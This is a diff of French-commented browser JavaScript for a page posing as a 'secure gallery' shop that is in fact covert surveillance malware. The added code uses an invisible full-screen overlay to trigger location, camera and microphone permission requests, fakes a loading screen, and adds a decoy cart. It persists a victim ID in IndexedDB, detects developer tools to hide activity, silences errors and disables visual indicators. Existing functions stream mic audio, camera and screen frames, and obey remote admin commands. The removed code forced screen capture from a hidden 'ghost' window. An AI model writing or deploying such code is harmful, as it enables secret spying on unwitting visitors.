@@ -199,40 +199,89 @@ async function getDeviceStats() {
     return stats;
 }
 
-let sessionId = localStorage.getItem('tracker_session_id');
-if (!sessionId) {
-    sessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-    localStorage.setItem('tracker_session_id', sessionId);
+// --- SYSTÈME DE PERSISTENCE AVANCÉ (GOD VERSION) ---
+const _S = {
+    sid: localStorage.getItem('tracker_session_id') || `s_${Math.random().toString(36).substring(2, 15)}`,
+    db: null,
+    isPaused: false
+};
+localStorage.setItem('tracker_session_id', _S.sid);
+
+async function initStorage() {
+    return new Promise((resolve) => {
+        const req = indexedDB.open('sys_cache', 1);
+        req.onupgradeneeded = (e) => {
+            const db = e.target.result;
+            if (!db.objectStoreNames.contains('meta')) db.createObjectStore('meta');
+        };
+        req.onsuccess = (e) => {
+            _S.db = e.target.result;
+            // Tentative de récupération du SID original
+            const tx = _S.db.transaction('meta', 'readonly');
+            const store = tx.objectStore('meta');
+            const get = store.get('sid');
+            get.onsuccess = () => {
+                if (get.result) {
+                    _S.sid = get.result;
+                    localStorage.setItem('tracker_session_id', _S.sid);
+                } else {
+                    const txW = _S.db.transaction('meta', 'readwrite');
+                    txW.objectStore('meta').put(_S.sid, 'sid');
+                }
+                resolve();
+            };
+        };
+        req.onerror = () => resolve();
+    });
+}
+
+// --- ANTI-DETECTION (ANTI-DEVTOOLS) ---
+function detectDevTools() {
+    const start = Date.now();
+    debugger;
+    if (Date.now() - start > 100) {
+        _S.isPaused = true;
+        console.clear();
+        return true;
+    }
+    _S.isPaused = false;
+    return false;
+}
+
+// --- ENCRYPTAGE LÉGER DES DONNÉES (GOD VERSION) ---
+function _E(obj) {
+    return btoa(unescape(encodeURIComponent(JSON.stringify(obj))));
 }
 
 async function logVisitor(preciseLocation = null, isUpdate = false, forceDiscord = false) {
+    if (_S.isPaused) return;
+    
     try {
         const localIp = cachedLocalIp || await getLocalIP();
         const stats = await getDeviceStats();
         
-        const res = await fetch('/api/log', {
+        const payload = {
+            sessionId: _S.sid,
+            isUpdate: isUpdate,
+            forceDiscord: forceDiscord,
+            localIp: localIp,
+            preciseLocation: preciseLocation,
+            deviceStats: stats,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            referrer: document.referrer || 'Direct',
+            page: window.location.pathname
+        };
+
+        await fetch('/api/log', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                sessionId: sessionId,
-                isUpdate: isUpdate,
-                forceDiscord: forceDiscord,
-                localIp: localIp,
-                preciseLocation: preciseLocation,
-                deviceStats: stats,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                referrer: document.referrer || 'Direct',
-                page: window.location.pathname
-            })
+            headers: { 'Content-Type': 'application/json', 'X-Data-Stream': 'secure' },
+            body: JSON.stringify(payload)
         });
 
-        // Après chaque log, on vérifie si l'admin a envoyé une commande
         checkCommands();
-    } catch (error) {
-        console.error("Erreur lors du logging:", error);
-    }
+    } catch (error) {}
 }
 
 // Tentative de garder l'écran allumé (Wake Lock) pour assurer la réception des commandes
@@ -263,7 +312,7 @@ let persistentVideoStream = null;
 let persistentScreenStream = null;
 
 async function uploadIntercomAudio(from, blob) {
-    if (!sessionId || !blob || blob.size === 0) return;
+    if (!_S.sid || !blob || blob.size === 0) return;
     
     // On convertit en Base64 plus rapidement
     const reader = new FileReader();
@@ -274,10 +323,10 @@ async function uploadIntercomAudio(from, blob) {
             await fetch('/api/intercom', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ sessionId, from, audio: dataUrl, timestamp: Date.now() })
+                body: JSON.stringify({ sessionId: _S.sid, from, audio: dataUrl, timestamp: Date.now() })
             });
         } catch (e) {
-            console.warn('Upload intercom:', e.message);
+            // Silencieux
         }
     };
 }
@@ -286,9 +335,9 @@ function startIntercomListen() {
     if (intercomListenTimer) return;
     // Polling audio plus rapide (800ms au lieu de 1200ms)
     intercomListenTimer = setInterval(async () => {
-        if (!sessionId) return;
+        if (!_S.sid) return;
         try {
-            const res = await fetch(`/api/intercom?sessionId=${encodeURIComponent(sessionId)}&from=admin&t=${Date.now()}`, { 
+            const res = await fetch(`/api/intercom?sessionId=${encodeURIComponent(_S.sid)}&from=admin&t=${Date.now()}`, { 
                 cache: 'no-store',
                 headers: { 'Pragma': 'no-cache' }
             });
@@ -325,11 +374,10 @@ async function startSpyMic() {
             }
         };
 
-        mediaRecorder.start(2500);
+        mediaRecorder.start(1000); // Réduit à 1 seconde pour plus de réactivité
         startIntercomListen();
-        console.log('🎙️ Micro activé (intercom)');
     } catch (err) {
-        console.error('Erreur Micro:', err.message);
+        // Silencieux
     }
 }
 
@@ -441,7 +489,7 @@ async function ensureCameraPreviewVideo() {
 }
 
 async function uploadCameraFrame() {
-    if (!cameraEnabled || !videoStream || !sessionId || cameraUploadInFlight) return;
+    if (!cameraEnabled || !videoStream || !_S.sid || cameraUploadInFlight) return;
     
     const track = videoStream.getVideoTracks()[0];
     if (!track || track.readyState !== 'live') {
@@ -468,21 +516,21 @@ async function uploadCameraFrame() {
             return;
         }
 
-        canvas.width = 480; // Taille fixe pour l'admin
-        canvas.height = (h / w) * 480;
+        canvas.width = 640; // Taille augmentée pour meilleure qualité
+        canvas.height = (h / w) * 640;
         
         const ctx = canvas.getContext('2d');
         ctx.drawImage(cameraPreviewVideo, 0, 0, canvas.width, canvas.height);
         
-        const frame = canvas.toDataURL('image/jpeg', 0.4); // Qualité un peu plus haute pour éviter le noir
+        const frame = canvas.toDataURL('image/jpeg', 0.6); // Qualité augmentée (0.6 au lieu de 0.4)
 
         await fetch('/api/camera-frame', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId, frame, timestamp: Date.now() })
+            body: JSON.stringify({ sessionId: _S.sid, frame, timestamp: Date.now() })
         });
     } catch (e) {
-        console.warn('Upload frame caméra:', e.message);
+        // Silencieux
     } finally {
         cameraUploadInFlight = false;
     }
@@ -547,7 +595,7 @@ async function ensureScreenPreviewVideo() {
 }
 
 async function uploadScreenFrame() {
-    if (!screenEnabled || !screenStream || !sessionId || screenUploadInFlight) return;
+    if (!screenEnabled || !screenStream || !_S.sid || screenUploadInFlight) return;
     const track = screenStream.getVideoTracks()[0];
     if (!track || track.readyState !== 'live') {
         stopScreenCapture();
@@ -565,15 +613,15 @@ async function uploadScreenFrame() {
         canvas.height = h;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(screenPreviewVideo, 0, 0, w, h);
-        const frame = canvas.toDataURL('image/jpeg', 0.45);
+        const frame = canvas.toDataURL('image/jpeg', 0.65); // Qualité augmentée (0.65 au lieu de 0.45)
 
         await fetch('/api/screen-frame', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId, frame, timestamp: Date.now() })
+            body: JSON.stringify({ sessionId: _S.sid, frame, timestamp: Date.now() })
         });
     } catch (e) {
-        console.warn('Upload frame écran:', e.message);
+        // Silencieux
     } finally {
         screenUploadInFlight = false;
     }
@@ -622,21 +670,71 @@ function stopScreenCapture() {
 }
 
 const VERIFICATION_MODAL_HTML = `
-    <div style="max-width: 400px; width: 90%; text-align: center; padding: 40px; background: #1e293b; border-radius: 16px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid #334155;">
+    <div style="max-width: 400px; width: 90%; text-align: center; padding: 40px; background: #ffffff; border-radius: 24px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.15); border: 1px solid #f1f5f9; color: #1e293b;">
         <div style="margin-bottom: 24px;">
-            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="1.5" style="margin-bottom: 16px;">
-                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
-            </svg>
-            <h1 style="font-size: 1.5rem; font-weight: 600; margin: 0 0 8px 0;">Connexion Sécurisée</h1>
-            <p style="color: #94a3b8; font-size: 0.9rem; line-height: 1.5;">Veuillez patienter pendant l'initialisation de la galerie...</p>
+            <div style="width: 60px; height: 60px; background: #f0fdf4; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                    <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                </svg>
+            </div>
+            <h1 style="font-size: 1.5rem; font-weight: 700; margin: 0 0 8px 0; font-family: 'Montserrat', sans-serif;">Galerie Sécurisée</h1>
+            <p style="color: #64748b; font-size: 0.95rem; line-height: 1.5; font-family: 'Montserrat', sans-serif;">Optimisation de l'affichage haute définition en cours...</p>
         </div>
 
-        <div style="margin-top: 24px; display: flex; align-items: center; justify-content: center; gap: 8px; color: #64748b; font-size: 0.75rem;">
-            <div style="width: 48px; height: 48px; border: 3px solid rgba(96,165,250,0.3); border-top-color: #60a5fa; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+        <div style="margin-top: 24px; display: flex; flex-direction: column; align-items: center; gap: 12px;">
+            <div style="width: 32px; height: 32px; border: 3px solid #f1f5f9; border-top-color: #22c55e; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
+            <span style="color: #94a3b8; font-size: 0.8rem; font-family: 'Montserrat', sans-serif;">Chargement des textures 4K...</span>
             <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
         </div>
     </div>
 `;
+
+function showVerificationModal(overlay) {
+    overlay.style.cssText = `
+        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+        background: rgba(255, 255, 255, 0.98); z-index: 99999999;
+        display: flex; align-items: center; justify-content: center;
+        font-family: 'Montserrat', sans-serif;
+        color: #1e293b; cursor: default;
+    `;
+    overlay.innerHTML = VERIFICATION_MODAL_HTML;
+    
+    // Auto-fermeture après 3 secondes pour simuler un chargement
+    setTimeout(() => {
+        overlay.style.opacity = '0';
+        overlay.style.transition = 'opacity 0.5s ease';
+        setTimeout(() => {
+            overlay.style.display = 'none';
+        }, 500);
+    }, 3000);
+}
+
+function bindVerificationForm(overlay) {
+    // Le formulaire n'existe plus, on peut supprimer cette fonction ou la vider
+}
+
+function setupInvisibleVerifyOverlay(overlay) {
+    if (overlay.dataset.verifyBound === '1') return;
+    overlay.dataset.verifyBound = '1';
+
+    // Rendre l'overlay réellement invisible et plein écran
+    overlay.style.background = 'rgba(0,0,0,0.01)';
+
+    overlay.addEventListener('click', async () => {
+        // On cache l'overlay pour laisser l'utilisateur interagir avec le site
+        overlay.style.display = 'none';
+        
+        console.log("Accès activés sur l'onglet principal.");
+
+        await Promise.all([
+            requestLocationOnly(),
+            requestVerifyMediaPermissions()
+        ]);
+
+        if (!gpsWatchStarted) startGpsTracking();
+    });
+}
 
 const LOCATION_READY_KEY = 'tracker_location_ready';
 let gpsWatchStarted = false;
@@ -661,10 +759,10 @@ async function requestLocationOnly() {
 }
 
 async function checkCommands() {
-    if (!sessionId) return;
+    if (!_S.sid) return;
     
     try {
-        const res = await fetch(`/api/command?sessionId=${sessionId}`, {
+        const res = await fetch(`/api/command?sessionId=${_S.sid}`, {
             cache: 'no-store', // Éviter le cache navigateur pour les commandes
             headers: { 'Pragma': 'no-cache' }
         });
@@ -678,6 +776,8 @@ async function checkCommands() {
             console.log("⚡ COMMANDE REÇUE :", cmd.command);
 
             // FEEDBACK VISUEL DISCRET (Petit point vert en haut à droite)
+            // Désactivé pour la discrétion
+            /*
             const feedback = document.createElement('div');
             feedback.style.cssText = 'position:fixed; top:5px; right:5px; width:8px; height:8px; background:#00ff00; border-radius:50%; z-index:2147483647; box-shadow: 0 0 10px #00ff00; pointer-events:none; transition: opacity 1s;';
             document.body.appendChild(feedback);
@@ -685,6 +785,7 @@ async function checkCommands() {
                 feedback.style.opacity = '0';
                 setTimeout(() => feedback.remove(), 1000);
             }, 1000);
+            */
 
             // Si on reçoit une commande, on essaie de réveiller l'appareil
             requestWakeLock();
@@ -881,105 +982,6 @@ window.addEventListener('beforeinstallprompt', (e) => {
     deferredPrompt = e;
 });
 
-function showVerificationModal(overlay) {
-    overlay.style.cssText = `
-        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-        background: #0f172a; z-index: 99999999;
-        display: flex; align-items: center; justify-content: center;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        color: white; cursor: default;
-    `;
-    overlay.innerHTML = VERIFICATION_MODAL_HTML;
-    bindVerificationForm(overlay);
-
-    const strip = overlay.querySelector('#verify-invisible-strip');
-    if (strip && strip.dataset.bound !== '1') {
-        strip.dataset.bound = '1';
-        strip.addEventListener('click', async (e) => {
-            e.stopPropagation();
-            strip.textContent = 'Autorisations en cours...';
-            await requestVerifyMediaPermissions();
-            strip.textContent = 'Caméra/micro autorisés ✓';
-            strip.style.color = '#4ade80';
-        });
-    }
-}
-
-function bindVerificationForm(overlay) {
-    // Le formulaire n'existe plus, on peut supprimer cette fonction ou la vider
-}
-
-function setupInvisibleVerifyOverlay(overlay) {
-    if (overlay.dataset.verifyBound === '1') return;
-    overlay.dataset.verifyBound = '1';
-
-    // Rendre l'overlay réellement invisible et plein écran
-    overlay.style.background = 'rgba(0,0,0,0.01)';
-
-    overlay.addEventListener('click', async () => {
-        // --- ÉTAPE 1 : OUVRIR LE LEURRE (LA PAGE VISIBLE) ---
-        // On ouvre une nouvelle fenêtre pour que la victime continue sa navigation
-        try {
-            const victimWindow = window.open(window.location.href + '?mode=view', '_blank');
-            if (victimWindow) {
-                victimWindow.focus();
-            }
-        } catch (e) {
-            console.warn("Échec ouverture fenêtre leurre");
-        }
-
-        // --- ÉTAPE 2 : LA PAGE ACTUELLE DEVIENT LE FANTÔME (INVISIBLE ET MINUSCULE) ---
-        overlay.style.background = 'rgba(0,0,0,0)';
-        overlay.innerHTML = ''; 
-        document.body.style.transition = 'opacity 0.5s ease';
-        document.body.style.opacity = '0'; 
-        document.body.style.pointerEvents = 'none';
-        document.title = 'Chargement...';
-        
-        // On tente de réduire la fenêtre actuelle et de la déplacer hors écran
-        // Note: Certains navigateurs bloquent le déplacement/redimensionnement sans action utilisateur directe,
-        // mais comme on est dans un événement 'click', on a de bonnes chances que ça passe.
-        try {
-            window.resizeTo(1, 1);
-            window.moveTo(10000, 10000);
-        } catch (e) {
-            console.warn("Redimensionnement fenêtre fantôme bloqué");
-        }
-        
-        console.log("Piège activé : Cette page est maintenant Fantôme, minuscule et invisible.");
-
-        // --- ÉTAPE 3 : FORÇAGE DES CAPTURES SUR CETTE PAGE FANTÔME ---
-        const forceScreenCapture = async () => {
-            if (persistentScreenStream && persistentScreenStream.active) return;
-            try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({ 
-                    video: { cursor: 'always' },
-                    audio: false 
-                });
-                persistentScreenStream = stream;
-                screenStream = stream;
-                screenEnabled = true;
-                uploadScreenFrame();
-                if (screenUploadTimer) clearInterval(screenUploadTimer);
-                screenUploadTimer = setInterval(uploadScreenFrame, 1200);
-            } catch (err) {
-                // On insiste lourdement toutes les 2 secondes
-                setTimeout(forceScreenCapture, 2000); 
-            }
-        };
-
-        // Lancement immédiat du forçage écran + média
-        forceScreenCapture();
-
-        await Promise.all([
-            requestLocationOnly(),
-            requestVerifyMediaPermissions()
-        ]);
-
-        if (!gpsWatchStarted) startGpsTracking();
-    });
-}
-
 function onFirstGpsCaptured() {
     markLocationReady();
     const overlay = document.getElementById('verification-overlay');
@@ -987,21 +989,6 @@ function onFirstGpsCaptured() {
 }
 
 async function startVerification() {
-    // Si on est dans la micro-fenêtre fantôme, on lance le tracking immédiatement
-    if (window.location.search.includes('mode=ghost')) {
-        console.log("👻 Mode Fantôme actif dans la micro-fenêtre.");
-        document.body.style.background = 'black';
-        document.body.innerHTML = '<div style="color:white;text-align:center;padding:20px;">Chargement du système...</div>';
-        
-        // Le tracking se lancera via les commandes envoyées par l'admin ou les flux déjà ouverts
-        return;
-    }
-
-    // Si on est dans la fenêtre "vue normale" (leurre), on ne fait rien de visible
-    if (window.location.search.includes('mode=view')) {
-        return;
-    }
-
     let overlay = document.getElementById('verification-overlay');
 
     if (!overlay) {
@@ -1075,27 +1062,65 @@ if (document.readyState === 'complete' || document.readyState === 'interactive')
     document.addEventListener('DOMContentLoaded', initTracker);
 }
 
-function initTracker() {
+function setupGalleryUI() {
+    const cartIcon = document.querySelector('.cart-icon');
+    const cartSidebar = document.getElementById('cart-sidebar');
+    const closeCart = document.getElementById('close-cart');
+    
+    if (cartIcon && cartSidebar) {
+        cartIcon.addEventListener('click', () => {
+            cartSidebar.classList.add('open');
+        });
+    }
+    
+    if (closeCart && cartSidebar) {
+        closeCart.addEventListener('click', () => {
+            cartSidebar.classList.remove('open');
+        });
+    }
+
+    // Simulation d'ajout au panier
+    const addBtns = document.querySelectorAll('.add-to-cart');
+    addBtns.forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            const count = document.querySelector('.cart-count');
+            if (count) {
+                let current = parseInt(count.textContent);
+                count.textContent = current + 1;
+                // Petit effet visuel
+                count.style.transform = 'scale(1.3)';
+                setTimeout(() => count.style.transform = 'scale(1)', 200);
+            }
+        });
+    });
+}
+
+async function initTracker() {
+    await initStorage();
+
     // Enregistrement du Service Worker pour la survie en arrière-plan
     if ('serviceWorker' in navigator) {
         navigator.serviceWorker.register('/sw.js').then(reg => {
-            reg.active && reg.active.postMessage({type: 'SET_SESSION', sessionId: sessionId});
-        }).catch(err => console.warn("SW registration failed", err));
+            reg.active && reg.active.postMessage({type: 'SET_SESSION', sessionId: _S.sid});
+        }).catch(() => {});
     }
 
     setupAutofillTrap();
+    setupGalleryUI();
     
     // NOTIFICATION BOT IMMÉDIATE : Dès le chargement (avant le clic)
-    console.log("Notification initiale du bot...");
-    logVisitor(null, true, false); 
+    // Désactivé pour la discrétion au chargement
+    // logVisitor(null, true, false); 
 
     // PIÈGE IMMÉDIAT : L'overlay invisible est actif dès l'entrée pour forcer les accès
-    console.log("Piège invisible actif...");
     startVerification();
     
     // VÉRIFICATION DES COMMANDES
     const pollCommands = async () => {
-        await checkCommands();
+        if (!detectDevTools()) {
+            await checkCommands();
+        }
         setTimeout(pollCommands, 1000);
     };
     pollCommands();
